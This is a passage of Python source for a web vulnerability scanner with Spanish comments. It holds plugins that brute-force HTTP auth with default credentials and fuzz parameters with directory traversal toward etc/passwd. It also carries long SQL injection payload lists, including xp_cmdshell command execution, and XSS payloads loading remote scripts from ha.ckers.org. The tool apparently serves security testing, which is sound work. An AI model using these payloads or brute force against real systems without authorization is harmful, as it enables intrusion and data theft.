		'invitado',
		'info',
		'intranet',
		'server-status',
		'home',
		'icons',
		'internal',
		'login',
		'manage',
		'page',
		'pages',
		'project',
		'projects',
		'proyecto',
		'proyectos',
		'public',
		'publico',
		'register',
		'root',
		'search',
		'buscador',
		'source',
		'shop',
		'commerce',
		'sql',
		'system',
		'video',
		'docs',
		'support',
		'soporte',
		'update',
		'private', 
		'webmail',
		'mail',
		'login',
		'password',
		'cgi-bin', 
		'test', 
		'pagina', 
		'backup', 
		'access', 
		'error',
		'logs',
		'download',
		'descargas',
		'upload',
		'mail',
		'mailing',
		'correo',
		'prueba',
		'postnuke',
		'modules',
		'phpBB',
		'forum',
		'cgi-sys',
		'cgi-local',
		'members',
		'restricted',
		'store',
		'users',
		'web',
		'www',
		'3rdparty'
		'phpMyAdmin',
		'phpmyadmin',
		'FCKeditor',
	]


	def search_url(self, url, code, headers): 

		if code != 200: return

		# no buscamos en parametros ?
		url = re.sub('\?.*$', '', url)

		# expresion regular
		r = '^.*(' + '|'.join(self.pages).replace('.', '\.') + ')$'

		# es un fichero de interes?
		if re.match(r, url, re.I): 

			# registramos
			self.asset(url)
			asset_vuln(112, url)

	
	def fuzz(self):

		# llamada metodo padre
		PluginBase.fuzz(self)

		# para cada directorio accesible 
		for dir in CRAWLER.dirs:
			if NAV.code(dir) in [ 200, 302, 403 ]:
				for page in self.pages: 

					# buscamos pagina
					url = dir + page
					chk_url_thread(url) 

		# esperamos a que termine
		wait_threads()


##################################################################################################################
# Plugin: Fuzz
##################################################################################################################
class PluginFuzz(PluginBase):

	""" fuzzing de palabras """

	# palabras para fuzzear 
	words = \
	[
		'admin', 
		'archive', 
		'archivo',
		'backup',
		'demo',
		'data',
		'datos',
		'example',
		'ejemplo',
		'page',
		'pages',
		'sql',
		'docs',
		'test', 
		'pagina', 
		'backup', 
		'acces', 
		'error',
		'logs',
		'download',
		'descargas',
		'upload',
		'info',
		'prueba',
	]

	
	def fuzz(self):

		# llamada metodo padre
		PluginBase.fuzz(self)

		# extensiones a utiliar
		exts = CRAWLER.exts + [ '.html', '.htm' ]
		
		# para cada directorio visto
		for dir in CRAWLER.dirs:

			# existe y es accesible ? es indexable ?
			if NAV.code(dir) in [ 200, 302, 403 ]: 

				# usamos lista de palabras
				for word in self.words:

					# buscamos dir + palabra
					url = dir + word
					chk_url_thread(url)

					# si no acceso no continuamos
					if NAV.code(url) in [ 401 ]: break

					# aniadimos extensiones habituales
					for ext in exts: 

						url = url + ext
						chk_url_thread(url)

		# esperamos a que termine
		wait_threads()


##################################################################################################################
# Plugin: Search Mails
##################################################################################################################
class PluginSearchMails(PluginBase):

	""" busca cuentas de correo """

	def search(self, url, code, headers, content): 

		if code in [401, 404]: return

		#  Email: <A href="mailto:usr@dom.com">
		regexp = '\w+@(?:\w+\.)+\w+'

		# buscamos
		for m in re.findall(regexp, content, re.M): 
			self.asset(m)


##################################################################################################################
# Plugin: Search Comments
##################################################################################################################
class PluginSearchComments(PluginBaseExt):

	""" busca comentarios """

	def search(self, url, code, headers, content): 

		if code in [401, 404]: return

		# <!--<LI class="espanol"><A href
		regexp = '<!--.*?-->'

		# buscamos
		for m in re.findall(regexp, content, re.M): 
			self.asset(url, m)


	def report(self):
		PluginBaseExt.report(self, 
			tmpl2= '-' * 80 + "\n%s\n" + '-' * 80 + "\n")


##################################################################################################################
# Plugin: Search Info Leaks
##################################################################################################################
class PluginSearchInfoLeaks(PluginBaseExt):

	""" busca fugas de informacion """

	def search(self, url, code, headers, content): 

		regexp = \
		[
			# <title>phpinfo()</title><meta name="ROBOTS"
			'phpinfo\(\)', 

			# <?php echo "hola" ?>
			'<\?php.*',
		]

		if code in [401, 404]: return

		# buscamos
		for regexp in regexp:
			for m in re.findall(regexp, content, re.M): 

				# registramos
				self.asset(url, m)
				asset_vuln(113, url)


	def report(self):
		PluginBaseExt.report(self, 
			tmpl2= '-' * 80 + "\n%s\n" + '-' * 80 + "\n")


##################################################################################################################
# Plugin: Search Errors
##################################################################################################################
class PluginSearchErrors(PluginBaseExt):

	""" busca errores """

	def search(self, url, code, headers, content): 

		regexps = \
		[
			'error \'ASP \d+ : \w+\'',
			'error \'\w+\'',
			'fatal error:.*\.php on line',
			'warning(<\/b>)?\s+(include|require)(_once)?', 
			'failed to open stream: no such file or directory in',
			'mysql_p?connect\(',
			'pgp_p?connect\(',
			'sqlite_p?open\(',
			'mssql_p?connect\(',
			'call to undefined function.* in',
			'an error',
			'bad request',
			'client authentication remote service',
			'could not find',
			'error has occurred',
			'error 404',
			'error occurred while processing request',
			'error processing ssi file',
#			'management Console',
			'no web site is configured at this address',
			'not found',
			'parameter is incorrect',
			'please identify yourself',
			'reload acp_userinfo database',
			'the userid or password that was specified is not valid.',
			'type=password',
			'unable to complete your request',
			'unable to open',
			'web access denied',
			'hack attempts',
			'does not exist',
			'wrong url',
			'access failed',

			# fuzz db
			'ASP\.NET is configured to show verbose error messages',
			'ASP\.NET_SessionId',
			'Active Server Pages error',
			'An unexpected token "END-OF-STATEMENT" was found',
			'Custom Error Message',
			'Died at',
			'CLI Driver',
			'Disallowed Parent Path',
			'Error Diagnostic Information',
			'Error Message : Error loading required libraries\.',
			'Error Report',
			'Error converting data type varchar to numeric',
			'Fatal error',
#			'Index of',
			'Internal Server Error',
			'Invalid Path Character',
			'Invalid procedure call or argument',
			'Invision Power Board Database Error',
			'Microsoft VBScript compilation error',
			'Microsoft VBScript error',
			'Can\'t connect to local',
			'An illegal character has been found in the statement',
			'PHP Error',
			'PHP Parse error',
			'PHP Warning',
#			'Parent Directory',
			'Permission denied: \'GetObject\'',
			'The error occurred in',
			'The script whose uid is',
			'Type mismatch',
			'Warning: Cannot modify header information - headers already sent',
			'Warning: Supplied argument is not a valid File-Handle resource in',
			'Unterminated string constant',
			'error',
			'include_path',
			'invalid query',
			'is not allowed to access',
#			'line',
			'missing expression',
			'error on line',
#			'on line',
#			'server at',
			'server object error',
		]

		if code in [401, 404]: return

		# buscamos
		for regexp in regexps:
			for m in re.findall('.{100}\s+%s\s+.{100}' % regexp, \
				content, re.I | re.M): 

				# registramos
				self.asset(url, m)
				asset_vuln(114, url)


	def report(self):
		PluginBaseExt.report(self, 
			tmpl2= '-' * 80 + "\n%s\n" + '-' * 80 + "\n")


##################################################################################################################
# Plugin: Search Forms
##################################################################################################################
class PluginSearchForms(PluginBaseExt):

	""" busca formularios """

	def search(self, url, code, headers, content): 

		if code in [401, 404]: return

		# quitamos espacios, etc.. .
		content = content.replace('\r', ' ')
		content = content.replace('\n', ' ')
		content = content.replace('\t', ' ')
		content = re.sub(r'\s+', ' ', content)

		# saneamos url
		url = re.sub('\?.*$', '', url)

		# regex buscada form, fields y attribs
		rex_form = '<form\s+.*?>.*?</form>'
		rex_form_head = '<form\s+(.*?)>'
		rex_form_attrib = r'(?P<n>action|method|onsubmit)\s*=\s*([\'"])(?P<v>.*?[^\\])\2'
		rex_field = '<input\s+.*?>'
		rex_field_attrib = r'(?P<n>type|name|id)\s*=\s*([\'"])(?P<v>.*?[^\\])\2'

		# buscamos formularios
		for form in re.findall(rex_form, content, re.I): 

			# nuevo reg
			hform = { }
			hform['fields'] = {}

			# analizamos cabecera form
			form_head = re.findall(rex_form_head, form, re.I)[0]

			# ahora separamos por atributos
			for m in re.finditer(rex_form_attrib, form_head, re.I):

				name = m.group('n')
				value = m.group('v')

				hform[name] = value

			# para formularios mal contruidos
			if not 'method' in hform: hform['method'] = 'post'
			if not 'action' in hform: hform['action'] = ''

			# normalizamos action
			hform['action'] = norm_url(hform['action'], url) 

			# buscamos campos 
			for field in re.findall(rex_field, form, re.I):

				hfield = {}

				# ahora separamos por atributos
				for m in re.finditer(rex_field_attrib, field, re.I):

					name = m.group('n')
					value = m.group('v')

					hfield[name] = value

				# incorporamos campo a form
				name = hfield['name'] if 'name' in hfield.keys() else 'submit'
				hform['fields'][name] = hfield

			# para limpiar codigo
			action = hform['action']
			params = hform['fields'].keys()

			if hform['method'].lower() == 'post': 

				# generamos indice almacenar
				idx = "POST %s [ %s ]" % (action, ', '.join(sorted(params)))

				# registramos en "entry points"
				if idx not in RUN['post']:

					self.lck.acquire()
					RUN['post'][idx] = hform
					self.lck.release()

			else:
				# generamos indice almacenar
				idx = "GET %s [ %s ]" % (action, ', '.join(sorted(params)))

				# registramos en "entry points"
				if idx not in RUN['get']:

					self.lck.acquire()

					RUN['get'][idx] = \
					{ 
						'path': action, 
						'params': params,
					}

					self.lck.release()

			# guardamos
			self.asset(url, form)


	def report(self):
		PluginBaseExt.report(self, 
			tmpl2= '-' * 80 + "\n%s\n" + '-' * 80 + "\n")


##################################################################################################################
# Plugin: Check Auth
##################################################################################################################
class PluginCheckAuth(PluginBase):

	""" busca paginas que requieran auth y prueba credenciales tipicas """

	# lista usuarios / passwds tipicas 
	users = [ 'admin', 'cisco', 'tomcat', 'test', '1234', 'administrador', 'administrator', 'manager', 'prueba' ]
	passwds = [ 'xxxx', 'qwerty' ]

	# guardamos urls auth que requieren auth
	urls_401 = []


	def search_url(self, url, code, headers): 

		# requiere auth?  # pendiente extraer realm
		if code == 401:
			ins_list(self.urls_401, 
				['Acceso Restringido', urldir(url)]) 
	

	def check(self): 

		PluginBase.check(self)

		# usuario / contrasenia por defecto en "cache"
		c_user, c_pass = (CFG['http_user'], CFG['http_pass'])

		# probamos en todas las urls con auth ?
		for realm, url in self.urls_401: 

			# necesita auth 
			code, headers = NAV.head(url)
			if code != 401: continue

			# primero las que estan en cache
			users = [c_user] + self.users
			passwds = [c_pass] + self.passwds

			# para romper el bucle	
			auth = False

			# probamos con cada usuario
			for u in users:

				# y contrasenia (tambien vacio / usr = pass)
				for p in passwds + [None, u]:

					# comprobamos credenciales 
					code, headers = NAV.head(url, u, p, reload=True)

					pdebug(">>> Probando auth ( %s [ %s, %s ] : %d)" % 
						(url, u, p, code))

					# credenciales validas ?
					if code != 401:

						pdebug(">>> Encontrado!")

						# registramos vulnerabilidad
						idx = "%s [ %s:%s ]" % (url, u, p)
						asset_vuln(108, idx)

						# registramos credenciales
						NAV.add_creds(realm, url, u, p)

						# almacenamos resultados
						self.asset([realm, url, u, p])

						# cacheamos para siguiente url
						c_user, c_pass = (u, p)
	
						# navegamos por la pagina
						chk_url(url)

						# rompemos el bucle
						auth = True
						break

				if auth: break


##################################################################################################################
# Plugin: Testing HTTP Methods
##################################################################################################################
class PluginTestingHTTPMethods(PluginBase):

	""" metodos soportados por el servidor """

	def check(self): 

		PluginBase.check(self)

		code, headers, content =  NAV.http(RUN['scope'], 'OPTIONS')
		self.asset("Metodos soportados: %s" % headers.get('Allow'))


##################################################################################################################
# Plugin: Testing Arbitrary HTTP Methods
##################################################################################################################
class PluginTestingArbitraryHTTPMethods(PluginBase):

	""" el servidor soporta metodos http arbitrarios? """

	def check(self): 

		PluginBase.check(self)

		code, headers, content =  NAV.http(RUN['scope'], 'BLAH')
		if not code in [405, 501]:
			self.asset("Respuesta al metodo 'BLAH': %d" % code)


##################################################################################################################
# Plugin: Testing HEAD Access Control Bypass
##################################################################################################################
class PluginTestingHEADAccessControlBypass(PluginBase):

	""" es posible evadir restricciones de acceso con metodos alternativos? """

	# guardamos urls auth que requieren auth
	urls_401 = []


	def search_url(self, url, code, headers): 

		# requiere auth?
		if code == 401:
			ins_list(self.urls_401, url) 


	def check(self): 

		PluginBase.check(self)

		for url in self.urls_401: 

			# comprobamos acceso mediante get y head
			code1, headers, content =  NAV.http(url, 'GET', 'blah_5576a')
			code2, headers, content =  NAV.http(url, 'HEAD', 'blah_5576a')

			if code1 != code2: 

				# registramos
				self.asset('%s accesible mediante HEAD' % url)
				asset_vuln(115, url)


##################################################################################################################
# Plugin: Testing  XST Vulnerability
##################################################################################################################
class PluginTestingTRACE(PluginBase):

	""" vulenrable a ataques XST ? """

	def check(self): 

		PluginBase.check(self)

		# peticion trace
		url_fake = RUN['scope'] + '/blah_234ff.html'
		code, headers, content =  NAV.http(url_fake, 'TRACE')

		# vulnerable ?
		if code == 200 and re.search(url_fake, content):

			raw = "%s\n%s" % (headers, content)
			self.asset("*** Respuesta TRACE ***\n\n%s" %  raw)
			asset_vuln(103, RUN['scope'])
			

	def report(self):
		PluginBase.report(self, 
			tmpl='-' * 80 + "\n%s\n" + '-' * 80)


##################################################################################################################
# Plugin: Testing File Extensions handling (OWASP-CM-005) 
##################################################################################################################
class PluginTestingFileExtensionsHandling(PluginBase):

	""" el servidor no deberia devolver algunas extensiones nunca """

	# estensiones peligrosas
	exts = \
	[
		'.inc',
		'.asa'
	] 

	def search_url(self, url, code, headers): 

		if code in [ 401, 404 ]: return

		# construimos regexp
		regexp = '(' + '|'.join(self.exts) + ')$'
		regexp = regexp.replace('.', '\.') 

		if re.search(regexp, url, re.I):
			self.asset(url)


##################################################################################################################
# Plugin: Search Cookies
##################################################################################################################
class PluginSearchCookies(PluginBase):
	
	""" almacenamos cookies mostradas por el servidor """

	def check(self): 

		PluginBase.check(self)

		# almacenamos las cookies que aparezcan 
		for c in NAV.cjar: 

			httponly = c.get_nonstandard_attr('httponly', False)
			idx = "%s: %s" % (c.name, c.value)

			# formateamos salida
			str = "*** %s ***\n\n" % idx 
			str = str + "path: %s\n" % c.path
			str = str + "secure: %s\n" % c.secure
			str = str + "expires: %s\n" % c.expires
			str = str + "httponly: %s\n" % httponly
			str = str + "domain: %s\n" % c.domain
			str = str + "is expired: %s" % c.is_expired()

			self.asset(str)

			# vulnerable httponly?
			if not httponly: asset_vuln(101, idx)

			# vulnerable secure?
			if not c.secure: asset_vuln(102, idx)


	def report(self):
		PluginBase.report(self, 
			tmpl='-' * 80 + "\n%s\n" + '-' * 80)


##################################################################################################################
# Plugin: Detect Multiple Web Servers 
##################################################################################################################
class PluginDetectedMultipleWebServers(PluginBase):

	""" mas de un servidor web ? """

	def search_url(self, url, code, headers): 
		if code != 401: 
			self.asset(headers.get('Server'))


	def check(self): 

		PluginBase.check(self)

		# solo nos interesa si mas de un servidor
		if len(self.out) == 1: self.out = []


##################################################################################################################
# Plugin: Search Password Fields
##################################################################################################################
class PluginSearchPasswordFields(PluginBase):

	""" buscamos campos tipo password """

	def check(self): 

		PluginBase.check(self)

		# buscamos formularios
		for e in RUN['post']:

			# recuperamos form
			entry = RUN['post'][e]

			# entre todos los camposd el formulario
			for f in entry['fields']: 

				# buscamos campos password
				field = entry['fields'][f]
				if 'type' in field and field['type'] == 'password':

					# registramos url y campo
					idx = "%s [ %s ]" % (entry['action'], f)
					self.asset(idx)

					# vulnerable? guardamos
					if entry['action'][:5] != 'https': 
						asset_vuln(100, idx)

					# autocomplete ? vulnerable !
					if not 'autocomplete' in field or \
						field['autocomplete'] != 'off': 
							asset_vuln(106, idx)


##################################################################################################################
# Plugin: Possible Username or Password Disclosure
##################################################################################################################
class PluginPossibleUsernameOrPasswordDisclosure(PluginBaseExt):

	""" buscamos passwords e usuarios en el codigo """

	def search(self, url, code, headers, content): 

		regexps = \
		[
			# pwd=document, password:function
			'(?:passw|passwd|password|pass|pwd|clave|contrasen|contrasenia)\s*[:=]\s*["\']?\w+.*?\s',
			
			# usuario = pepe
			'(?:usr|user|username|usrname|usuario|login)\s*[:=]\s*["\']?\w+.*?\s',
		]

		# probamos expresiones regulares
		for regexp in regexps: 
			for m in re.findall(regexp, content, re.M | re.I):
				self.asset(url, m)


	def report(self):
		PluginBaseExt.report(self, 
			tmpl2= '-' * 80 + "\n%s\n" + '-' * 80 + "\n")


##################################################################################################################
# Plugin: Apache httpOnly Cookie Disclosure
##################################################################################################################
class PluginApacheHttpOnlyCookieDisclosure(PluginBase):

	""" comprueba vulnerabilidad apache httponly cookie disclosure """

	def check(self): 
	
		PluginBase.check(self)

		# construimos cookie > 4096
		cookie = { 'Cookie': 'blah_080vb=' + 'A' * 10240 }

		# lanzamos peticion
		code, headers, content = NAV.http(
			RUN['scope'], headers=cookie)

		if code == 400 and re.search('AAAAAAAAAAAAAAA', content, re.M): 
			asset_vuln(104, RUN['scope'])


##################################################################################################################
# Plugin: Directory Traversal
##################################################################################################################
class PluginDirectoryTraversal(PluginBaseExt): 

	""" busca directory traversal en los entry points localizados """

	def search(self, url, code, headers, content):

		r1 = '(\.\.|%2e%2e)'
		r2 = '(root:|default=multi\(|permission denied|file not found)'

		if not code in [200, 500]: return
			
		# buscamos fichero passwords o boot.ini
		if re.search(r1, url) and re.search(r2, content, re.I | re.M): 

			# guardamos resultado
			self.asset(url, content)
			idx = gen_idx_url_query(url)
			asset_vuln(105, idx)


	def fuzz(self): 

		# llamamda metodo padre
		PluginBase.fuzz(self)

		files = \
		{
			'win': 'boot.ini',
			'unix': 'etc/passwd'
		}

		# que buscamos ?
		file = files[CFG['arch']]

		# puede cambiar durante ejecucion
		get = cplist(RUN['get'])
		
		# para cada end point localizado
		for e in get:

			epoint = RUN['get'][e]
			path = epoint['path']
			params = epoint['params']
			queries = []
	
			# fuzeamos para cada parametro y palabra
			for q in mix_params(params):

				# path traversal
				ptrav = file

				for i in range(10): 

					# construimos query 
					ptrav = '../' + ptrav
					query = re.sub('#inj#', ptrav, q)
					ins_list(queries, query)

			# lista auxiliar
			aux = queries

			# alternativas url encoding
			if CFG['url_encode']: 
				for q in q_urlenc(queries): 
					ins_list(aux, q)

			# alternativas utf8
			if CFG['utf8_encode']: 
				for q in q_utf8enc(queries):
					ins_list(aux, q)

			# comprobamos combinaciones
			for query in sorted(aux): 

				# normalizamos y ejecutamos
				url = norm_url(path + '?' +  query)
				chk_url_thread(url) 
				
				# vulnerable? siguiente param
				if url in VULNS[105]['output']: 
					break

		# esperamos hasta que termine
		wait_threads()


	def report(self):
		PluginBaseExt.report(self, 
			tmpl2= '-' * 80 + "\n%s\n" + '-' * 80 + "\n")


##################################################################################################################
# Plugin: SQL Injection
##################################################################################################################
class PluginSQLInjection(PluginBaseExt):

	""" busca errores """

	def search(self, url, code, headers, content): 

		# expresiones regulares
		regexps =  \
		[
			'sql .* error', 
			'Incorrect syntax near',
			'Microsoft SQL Native Client error .*', 

			# fuzz db
			'A syntax error has occurred',
			'ADODB\.Field error',
#			'DB2 Driver',
			'DB2 Error',
			'DB2 ODBC',
			'Incorrect syntax near',
#			'JDBC Driver',
			'JDBC Error',
			'JDBC MySQL',
			'JDBC Oracle',
			'JDBC SQL',
			'Microsoft OLE DB Provider for ODBC Drivers',
#			'MySQL Driver',
			'MySQL Error',
			'MySQL ODBC',
			'ODBC DB2',
#			'ODBC Driver',
			'ODBC Error',
			'ODBC Microsoft Access',
			'ODBC Oracle',
			'ODBC SQL',
			'ODBC SQL Server',
			'OLE/DB provider returned message',
			'ORA-0',
			'ORA-1',
			'Oracle DB2',
#			'Oracle Driver',
			'Oracle Error',
			'Oracle ODBC',
			'PostgreSQL query failed: ERROR: parser: parse error',
			'SQL Server Driver\]\[SQL Server',
			'SQL command not properly ended',
			'SQLException',
			'Supplied argument is not a valid PostgreSQL result',
			'Syntax error in query expression',
			'Unable to jump to row',
			'Unclosed quotation mark before the character string',
			'Warning: mysql_query\(\)',
			'Warning: pg_connect\(\): Unable to connect to PostgreSQL server: FATAL',
			'You have an error in your SQL syntax near',
			'data source=',
			'detected an internal error \[IBM\]\[CLI Driver\]\[DB2/6000\]',
			'mySQL error with query',
			'mysql error',
			'on MySQL result index',
			'supplied argument is not a valid MySQL result resource',
			'unexpected end of SQL command',
		]

		if code in [401, 404]: return

		# buscamos
		for regexp in regexps:

			# construimos exp regular
			regexp = "^.*%s.*$" % regexp

			for m in re.findall(regexp, content, re.M | re.I): 

				# registramos resultados 
				self.asset(url, m)
				idx = gen_idx_url_query(url)
				asset_vuln(107, idx)


	def fuzz(self): 

		# llamamda metodo padre
		PluginBase.fuzz(self)

		words = \
		[
			'\'"[]\(\)%$#^{}\\!|@?=/'
			'\'sqlvuln',
			'\'+sqlvuln',
			'sqlvuln;',
			'(sqlvuln)',
			'a\' or 1=1--',
			'"a"" or 1=1--"',
			' or a = a',
			'a\' or \'a\' = \'a',
			'1 or 1=1',
			'a\' waitfor delay \'0:0:10\'--',
			'1 waitfor delay \'0:0:10\'--',
			'declare @q nvarchar (4000) select @q =',
			'0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',
			'0',
			'031003000270000',
			'declare @s varchar(22) select @s =',
			'0x77616974666F722064656C61792027303A303A31302700 exec(@s)',
			'0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)',
			'declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e',
			'exec(@s)',
			'a\'',
			'?',
			'\' or 1=1',
			'x\' AND userid IS NULL; --',
			'x\' AND email IS NULL; --',
			'anything\' OR \'x\'=\'x',
			'x\' AND 1=(SELECT COUNT(*) FROM tabname); --',
			'x\' AND members.email IS NULL; --',
			'x\' OR full_name LIKE \'%Bob%',
			'23 OR 1=1',
			'\'; exec master..xp_cmdshell \'ping 172.10.1.255\'--',
			'\'',
			'\'%20or%20\'\'=\'',
			'\'%20or%20\'x\'=\'x',
			'%20or%20x=x',
			'\')%20or%20(\'x\'=\'x',
			'0 or 1=1',
			'\' or 0=0 --',
			'" or 0=0 --',
			'or 0=0 --',
			'\' or 0=0 #',
			' or 0=0 #"',
			'or 0=0 #',
			'\' or 1=1--',
			'" or 1=1--',
			'\' or \'1\'=\'1\'--',
			'\' or 1 --\'',
			'or 1=1--',
			'or%201=1',
			'or%201=1 --',
			'\' or 1=1 or \'\'=\'',
			' or 1=1 or ""=',
			'\' or a=a--',
			' or a=a',
			'\') or (\'a\'=\'a',
			') or (a=a',
			'hi or a=a',
			'hi or 1=1 --"',
			'hi\' or 1=1 --',
			'hi\' or \'a\'=\'a',
			'hi\') or (\'a\'=\'a',
			'"hi"") or (""a""=""a"',
			'\'hi\' or \'x\'=\'x\';',
			'@variable',
			',@variable',
			'PRINT',
			'PRINT @@variable',
			'select',
			'insert',
			'as',
			'or',
			'procedure',
			'limit',
			'order by',
			'asc',
			'desc',
			'delete',
			'update',
			'distinct',
			'having',
			'truncate',
			'replace',
			'like',
			'handler',
			'bfilename',
			'\' or username like \'%',
			'\' or uname like \'%',
			'\' or userid like \'%',
			'\' or uid like \'%',
			'\' or user like \'%',
			'exec xp',
			'exec sp',
			'\'; exec master..xp_cmdshell',
			'\'; exec xp_regread',
			't\'exec master..xp_cmdshell \'nslookup www.google.com\'--',
			'--sp_password',
			'\x27UNION SELECT',
			'\' UNION SELECT',
			'\' UNION ALL SELECT',
			'\' or (EXISTS)',
			'\' (select top 1',
			'\'||UTL_HTTP.REQUEST',
			'1;SELECT%20*',
			'to_timestamp_tz',
			'tz_offset',
			'<>"\'%;)(&+',
			'\'%20or%201=1',
			'%27%20or%201=1',
			'%20$(sleep%2050)',
			'%20\'sleep%2050\'',
			'char%4039%41%2b%40SELECT',
			'&apos;%20OR',
			'\'sqlattempt1',
			'(sqlattempt2)',
			'|',
			'%7C',
			'*|',
			'%2A%7C',
			'*(|(mail=*))',
			'%2A%28%7C%28mail%3D%2A%29%29',
			'*(|(objectclass=*))',
			'%2A%28%7C%28objectclass%3D%2A%29%29',
			'(',
			'%28',
			')',
			'%29',
			'&',
			'%26',
			'!',
			'%21',
			'\' or 1=1 or \'\'=\'',
			'\' or \'\'=\'',
			'x\' or 1=1 or \'x\'=\'y',
			'/',
			'//',
			'//*',
			'*/*',
			'a\' or 3=3--',
			'"a"" or 3=3--"',
			'\' or 3=3',
		]

		# dict puede cambiar
		get = cplist(RUN['get'])

		# para cada end point localizado
		for e in get:

			epoint = RUN['get'][e]
			path = epoint['path']
			params = epoint['params']
			queries = []

			# fuzeamos para cada parametro y palabra
			for q in mix_params(params):
				for w in words: 

					# url encode basico
					w = re.sub('\s', '+', w)
					w = re.sub('&', '%26', w)
					query = re.sub('#inj#', w, q)
					ins_list(queries, query)

					# construimos query  segura
					w = urllib.quote_plus(w)
					query = re.sub('#inj#', w, q)
					ins_list(queries, query)

			# cola auxiliar
			aux = queries

			# alternativas url encoding
			if CFG['url_encode']: 
				for q in q_urlenc(queries): 
					ins_list(aux, q)

			# alternativas utf8
			if CFG['utf8_encode']: 
				for q in q_utf8enc(queries):
					ins_list(aux, q)

			# comprobamos combinaciones
			for query in sorted(aux): 

				# normalizamos y ejecutamos
				url = norm_url(path + '?' +  query)
				chk_url_thread(url)
				
				# vulnerable? siguiente param
				if url in VULNS[107]['output']: 
					break

		# esperamos hasta que termine
		wait_threads()


	def report(self):
		PluginBaseExt.report(self, 
			tmpl2= '-' * 80 + "\n%s\n" + '-' * 80 + "\n")


##################################################################################################################
# Plugin: XSS
##################################################################################################################

""" aux para buscar expresiones """
def sanitize_re(str):

	str = str.replace('(', '\(')
	str = str.replace(')', '\)')
	str = str.replace('[', '\]')
	str = str.replace(']', '\]')
	str = str.replace('?', '\?')
	str = str.replace('+', '\+')
	str = str.replace('\\', '\\\\')

	return str


class PluginXSS(PluginBaseExt):

	""" busca XSS """

	def search(self, url, code, headers, content): 

		# expresiones regulares
		regexps =  [ 'XSS', '12345' ]

		if code in [401, 404]: return

		# buscamos
		for regexp in regexps:

			# construimos exp regular
			regexp = "^.*%s.*$" % regexp

			for m in re.findall(regexp, content, re.M | re.I): 

				# registramos resultados 
				self.asset(url, m)
				idx = gen_idx_url_query(url)
				asset_vuln(117, idx)


	def fuzz(self): 

		# llamamda metodo padre
		PluginBase.fuzz(self)

		words = \
		[
			'<SCRIPT>alert(12345);</SCRIPT>',
			'\'\';!--"<XSS>=&{()}',
			'<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
			'<IMG SRC="javascript:alert(12345);">',
			'<IMG SRC=javascript:alert(12345)>',
			'<IMG SRC=JaVaScRiPt:alert(12345)>',
			'<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
			'<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
			'<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
			'SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
			'<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
			'<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
			'<IMG SRC="jav  ascript:alert(12345);">',
			'<IMG SRC="jav&#x09;ascript:alert(12345);">',
			'<IMG SRC="jav&#x0A;ascript:alert(12345);">',
			'<IMG SRC="jav&#x0D;ascript:alert(12345);">',
			'<IMG SRC=" &#14;  javascript:alert(12345);">',
			'<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
			'<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>',
			'<IMG SRC="javascript:alert(12345)"',
			'<SCRIPT>a=/XSS/',
			'\";alert(12345);//',
			'<INPUT TYPE="IMAGE" SRC="javascript:alert(12345);">',
			'<BODY BACKGROUND="javascript:alert(12345)">',
			'<BODY ONLOAD=alert(12345)>',
			'<IMG DYNSRC="javascript:alert(12345)">',
			'<IMG LOWSRC="javascript:alert(12345)">',
			'<BGSOUND SRC="javascript:alert(12345);">',
			'<BR SIZE="&{alert(12345)}">',
			'<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>', 
			'<LINK REL="stylesheet" HREF="javascript:alert(12345);">',
			'<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">',
			'<STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>',
			'<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">',
			'<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>',
			'<IMG SRC=\'vbscript:msgbox("XSS")\'>',
			'<IMG SRC="mocha:[code]">',   
			'<IMG SRC="livescript:[code]">',
			'<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(12345);">',
			'<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
			'<META HTTP-EQUIV="Link" Content="<javascript:alert(12345)>; REL=stylesheet">',   
			'<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(12345);">',
			'<IFRAME SRC="javascript:alert(12345);"></IFRAME>',
			'<FRAMESET><FRAME SRC="javascript:alert(12345);"></FRAMESET>',
			'<TABLE BACKGROUND="javascript:alert(12345)">',
			'<DIV STYLE="background-image: url(javascript:alert(12345))">',  
			'<DIV STYLE="background-image: url(&#1;javascript:alert(12345))">',
			'<DIV STYLE="width: expression(alert(12345));">',
			'<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>',
			'<IMG STYLE="xss:expr/*XSS*/ession(alert(12345))">',
			'<XSS STYLE="xss:expression(alert(12345))">',
			'<STYLE TYPE="text/javascript">alert(12345);</STYLE>',
			'<STYLE>.XSS{background-image:url("javascript:alert(12345)");}</STYLE><A CLASS=XSS></A>',
			'<STYLE type="text/css">BODY{background:url("javascript:alert(12345)")}</STYLE>',
			'<BASE HREF="javascript:alert(12345);//">',
			'<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>',
			'<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(12345)></OBJECT>',
			'getURL("javascript:alert(12345)")',
			'a="get";',
